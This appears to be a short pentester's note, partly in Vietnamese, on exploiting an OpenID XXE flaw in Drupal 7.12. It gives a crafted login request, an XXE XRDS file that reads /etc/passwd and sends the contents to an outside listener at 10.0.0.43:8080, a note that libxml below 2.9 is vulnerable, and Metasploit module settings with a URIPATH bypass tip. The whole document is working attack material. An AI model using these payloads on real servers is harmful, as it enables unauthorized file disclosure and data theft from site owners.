- Payload: 
	?q=node&destination=node" --data "openid_identifier=http%3a//RHOST%3aRPORT/xxe.xml&name=&pass=&form_id=user_login_block&op=Log%20in"

	<!DOCTYPE foo [ 
		<!ELEMENT URI ANY>
		<!ENTITY xxe SYSTEM "file:///etc/passwd">
	 ]>
	 <xrds:XRDS xmlns:openid='http://openid.net/xmlns/1.0' xmlns='xri://$xrd*($v*2.0)' xmlns:xrds='xri://$xrds'>
		 <XRD>
		 	<Status cid='verified'/>
		 	<ProviderID>xri://@</ProviderID>
		 	<CanonicalID>http://example.com/user</CanonicalID><Service>
		 	<Type>http://specs.openid.net/auth/2.0/signon</Type>
		 	<Type>http://openid.net/srv/ax/1.0</Type>
		 	<URI>http://10.0.0.43:8080/abc/Hlng/&xxe;/JUOcW</URI>
		 	<LocalID>http://example.com/xrds</LocalID>
		 	</Service>
		 </XRD>
	 </xrds:XRDS>

- Payload này chỉ khai thác (đọc file) được trong trường hợp libxml < 2.9
- Metasploit
	+ Phải set URIPATH là *.xml để có thể bypass

msf auxiliary(drupal_openid_xxe_2) > use auxiliary/gather/drupal_openid_xxe
msf auxiliary(drupal_openid_xxe) > show options

Module options (auxiliary/gather/drupal_openid_xxe):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILEPATH   /etc/passwd      yes       The filepath to read on the server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.0.0.11        yes       The target address
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /drupal-7.12     yes       Base Drupal directory path
   URIPATH    xxe.xml          no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host
